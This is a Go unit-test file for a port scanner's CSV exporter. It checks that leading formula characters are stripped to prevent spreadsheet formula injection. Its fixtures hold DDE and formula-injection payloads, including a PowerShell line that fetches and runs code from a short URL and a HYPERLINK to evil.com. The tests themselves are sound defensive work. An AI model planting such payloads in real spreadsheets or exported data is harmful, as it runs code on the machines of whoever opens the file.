package exporter

import (
	"bytes"
	"strings"
	"testing"
	"time"

	"github.com/lucchesi-sec/portscan/internal/core"
)

func TestSanitizeCSVField(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "empty string",
			input:    "",
			expected: "",
		},
		{
			name:     "normal text",
			input:    "normal text",
			expected: "normal text",
		},
		{
			name:     "leading equals sign - formula injection",
			input:    "=cmd|'/c calc'!A1",
			expected: "cmd|'/c calc'!A1",
		},
		{
			name:     "leading plus sign - formula injection",
			input:    "+cmd|'/c calc'!A1",
			expected: "cmd|'/c calc'!A1",
		},
		{
			name:     "leading minus sign - formula injection",
			input:    "-cmd|'/c calc'!A1",
			expected: "cmd|'/c calc'!A1",
		},
		{
			name:     "leading at sign - formula injection",
			input:    "@cmd|'/c calc'!A1",
			expected: "cmd|'/c calc'!A1",
		},
		{
			name:     "multiple leading formula characters",
			input:    "=+-@=test",
			expected: "test",
		},
		{
			name:     "field exceeding max length",
			input:    strings.Repeat("a", 300),
			expected: strings.Repeat("a", 256),
		},
		{
			name:     "field at max length",
			input:    strings.Repeat("a", 256),
			expected: strings.Repeat("a", 256),
		},
		{
			name:     "formula with field over max length",
			input:    "=" + strings.Repeat("a", 300),
			expected: strings.Repeat("a", 256),
		},
		{
			name:     "leading tab after sanitization",
			input:    "\ttest",
			expected: "test",
		},
		{
			name:     "leading carriage return",
			input:    "\rtest",
			expected: "test",
		},
		{
			name:     "leading newline",
			input:    "\ntest",
			expected: "test",
		},
		{
			name:     "valid IP address",
			input:    "192.168.1.1",
			expected: "192.168.1.1",
		},
		{
			name:     "valid service name",
			input:    "SSH-2.0-OpenSSH_8.2",
			expected: "SSH-2.0-OpenSSH_8.2",
		},
		{
			name:     "DDE attack vector",
			input:    "=cmd|'/c powershell IEX(wget bit.ly/1234)'!A1",
			expected: "cmd|'/c powershell IEX(wget bit.ly/1234)'!A1",
		},
		{
			name:     "HYPERLINK formula injection",
			input:    `=HYPERLINK("http://evil.com","click")`,
			expected: `HYPERLINK("http://evil.com","click")`,
		},
		{
			name:     "leading space before equals",
			input:    " =cmd|'/c calc'!A1",
			expected: "cmd|'/c calc'!A1",
		},
		{
			name:     "multiple spaces before plus",
			input:    "  +2+5+cmd",
			expected: "2+5+cmd",
		},
		{
			name:     "tab before at symbol",
			input:    "\t@SUM(1+1)",
			expected: "SUM(1+1)",
		},
		{
			name:     "mixed whitespace before formula",
			input:    " \t\r=HYPERLINK",
			expected: "HYPERLINK",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := sanitizeCSVField(tt.input)
			if result != tt.expected {
				t.Errorf("sanitizeCSVField() = %q, want %q", result, tt.expected)
			}
		})
	}
}

func TestCSVExporter_FormulaInjectionPrevention(t *testing.T) {
	tests := []struct {
		name           string
		host           string
		banner         string
		expectedHost   string
		expectedBanner string
	}{
		{
			name:           "formula in banner",
			host:           "192.168.1.1",
			banner:         "=cmd|'/c calc'!A1",
			expectedHost:   "192.168.1.1",
			expectedBanner: "cmd|'/c calc'!A1",
		},
		{
			name:           "formula in host",
			host:           "=evil.com",
			banner:         "SSH-2.0",
			expectedHost:   "evil.com",
			expectedBanner: "SSH-2.0",
		},
		{
			name:           "plus formula in banner",
			host:           "10.0.0.1",
			banner:         "+2+5+cmd|'/c calc'!A1",
			expectedHost:   "10.0.0.1",
			expectedBanner: "2+5+cmd|'/c calc'!A1",
		},
		{
			name:           "at symbol formula",
			host:           "test.local",
			banner:         "@SUM(1+1)*cmd|'/c calc'!A1",
			expectedHost:   "test.local",
			expectedBanner: "SUM(1+1)*cmd|'/c calc'!A1",
		},
		{
			name:           "long banner truncation",
			host:           "host.com",
			banner:         "=" + strings.Repeat("A", 300),
			expectedHost:   "host.com",
			expectedBanner: strings.Repeat("A", 256),
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var buf bytes.Buffer
			exporter := NewCSVExporter(&buf)

			events := make(chan core.Event, 1)
			events <- core.Event{
				Kind: core.EventKindResult,
				Result: &core.ResultEvent{
					Host:     tt.host,
					Port:     80,
					State:    core.StateOpen,
					Banner:   tt.banner,
					Duration: 10 * time.Millisecond,
				},
			}
			close(events)

			exporter.Export(events)
			if err := exporter.Close(); err != nil {
				t.Fatalf("Close() error = %v", err)
			}

			output := buf.String()
			if !strings.Contains(output, tt.expectedHost) {
				t.Errorf("CSV output missing expected host %q, got: %s", tt.expectedHost, output)
			}
			if !strings.Contains(output, tt.expectedBanner) {
				t.Errorf("CSV output missing expected banner %q, got: %s", tt.expectedBanner, output)
			}

			// Ensure formula characters are not at the start of any field
			lines := strings.Split(output, "\n")
			for i, line := range lines {
				if i == 0 || line == "" {
					continue // Skip header and empty lines
				}
				fields := strings.Split(line, ",")
				for j, field := range fields {
					field = strings.Trim(field, "\"") // Remove CSV quotes
					if len(field) > 0 && strings.ContainsAny(string(field[0]), "=+-@") {
						t.Errorf("Line %d, field %d starts with formula character: %q", i, j, field)
					}
				}
			}
		})
	}
}

func TestCSVExporter_Export(t *testing.T) {
	tests := []struct {
		name     string
		events   []core.Event
		expected []string
	}{
		{
			name: "single open port",
			events: []core.Event{
				{
					Kind: core.EventKindResult,
					Result: &core.ResultEvent{
						Host:     "192.168.1.1",
						Port:     22,
						State:    core.StateOpen,
						Banner:   "SSH-2.0-OpenSSH_8.2",
						Duration: 10 * time.Millisecond,
					},
				},
			},
			expected: []string{
				"host,port,state,banner,latency_ms",
				"192.168.1.1,22,open,SSH-2.0-OpenSSH_8.2,10",
			},
		},
		{
			name: "multiple results",
			events: []core.Event{
				{
					Kind: core.EventKindResult,
					Result: &core.ResultEvent{
						Host:     "10.0.0.1",
						Port:     80,
						State:    core.StateOpen,
						Banner:   "HTTP/1.1",
						Duration: 5 * time.Millisecond,
					},
				},
				{
					Kind: core.EventKindResult,
					Result: &core.ResultEvent{
						Host:     "10.0.0.1",
						Port:     443,
						State:    core.StateOpen,
						Banner:   "HTTPS",
						Duration: 8 * time.Millisecond,
					},
				},
			},
			expected: []string{
				"host,port,state,banner,latency_ms",
				"10.0.0.1,80,open,HTTP/1.1,5",
				"10.0.0.1,443,open,HTTPS,8",
			},
		},
		{
			name: "non-result events ignored",
			events: []core.Event{
				{
					Kind: core.EventKindError,
				},
				{
					Kind: core.EventKindResult,
					Result: &core.ResultEvent{
						Host:     "test.com",
						Port:     25,
						State:    core.StateOpen,
						Banner:   "SMTP",
						Duration: 15 * time.Millisecond,
					},
				},
			},
			expected: []string{
				"host,port,state,banner,latency_ms",
				"test.com,25,open,SMTP,15",
			},
		},
		{
			name: "empty banner",
			events: []core.Event{
				{
					Kind: core.EventKindResult,
					Result: &core.ResultEvent{
						Host:     "example.com",
						Port:     8080,
						State:    core.StateClosed,
						Banner:   "",
						Duration: 2 * time.Millisecond,
					},
				},
			},
			expected: []string{
				"host,port,state,banner,latency_ms",
				"example.com,8080,closed,,2",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var buf bytes.Buffer
			exporter := NewCSVExporter(&buf)

			events := make(chan core.Event, len(tt.events))
			for _, e := range tt.events {
				events <- e
			}
			close(events)

			exporter.Export(events)
			if err := exporter.Close(); err != nil {
				t.Fatalf("Close() error = %v", err)
			}

			output := buf.String()
			lines := strings.Split(strings.TrimSpace(output), "\n")

			if len(lines) != len(tt.expected) {
				t.Errorf("Expected %d lines, got %d\nOutput:\n%s", len(tt.expected), len(lines), output)
			}

			for i, expectedLine := range tt.expected {
				if i >= len(lines) {
					break
				}
				if lines[i] != expectedLine {
					t.Errorf("Line %d mismatch\nExpected: %q\nGot:      %q", i, expectedLine, lines[i])
				}
			}
		})
	}
}

func TestCSVExporter_Close(t *testing.T) {
	t.Run("successful close", func(t *testing.T) {
		var buf bytes.Buffer
		exporter := NewCSVExporter(&buf)

		events := make(chan core.Event, 1)
		events <- core.Event{
			Kind: core.EventKindResult,
			Result: &core.ResultEvent{
				Host:     "test.com",
				Port:     80,
				State:    core.StateOpen,
				Banner:   "test",
				Duration: 10 * time.Millisecond,
			},
		}
		close(events)

		exporter.Export(events)
		err := exporter.Close()
		if err != nil {
			t.Errorf("Close() returned unexpected error: %v", err)
		}

		// Verify output was flushed
		if buf.Len() == 0 {
			t.Error("Close() did not flush data to writer")
		}
	})

	t.Run("close after write error", func(t *testing.T) {
		// Use a writer that will fail
		failWriter := &failingWriter{failAfter: 0}
		exporter := NewCSVExporter(failWriter)

		events := make(chan core.Event, 1)
		events <- core.Event{
			Kind: core.EventKindResult,
			Result: &core.ResultEvent{
				Host:     "test.com",
				Port:     80,
				State:    core.StateOpen,
				Banner:   "test",
				Duration: 10 * time.Millisecond,
			},
		}
		close(events)

		exporter.Export(events)
		err := exporter.Close()
		if err == nil {
			t.Error("Close() should return error after write failure")
		}
	})
}

// failingWriter is a test helper that fails after a certain number of writes
type failingWriter struct {
	failAfter int
	writes    int
}

func (w *failingWriter) Write(p []byte) (n int, err error) {
	if w.writes >= w.failAfter {
		return 0, bytes.ErrTooLarge
	}
	w.writes++
	return len(p), nil
}

func TestCSVExporter_StateSanitization(t *testing.T) {
	tests := []struct {
		name     string
		state    core.ScanState
		expected string
	}{
		{
			name:     "open state",
			state:    core.StateOpen,
			expected: "open",
		},
		{
			name:     "closed state",
			state:    core.StateClosed,
			expected: "closed",
		},
		{
			name:     "filtered state",
			state:    core.StateFiltered,
			expected: "filtered",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var buf bytes.Buffer
			exporter := NewCSVExporter(&buf)

			events := make(chan core.Event, 1)
			events <- core.Event{
				Kind: core.EventKindResult,
				Result: &core.ResultEvent{
					Host:     "test.com",
					Port:     80,
					State:    tt.state,
					Banner:   "test",
					Duration: 10 * time.Millisecond,
				},
			}
			close(events)

			exporter.Export(events)
			if err := exporter.Close(); err != nil {
				t.Fatalf("Close() error = %v", err)
			}

			output := buf.String()
			if !strings.Contains(output, tt.expected) {
				t.Errorf("CSV output missing expected state %q, got: %s", tt.expected, output)
			}
		})
	}
}
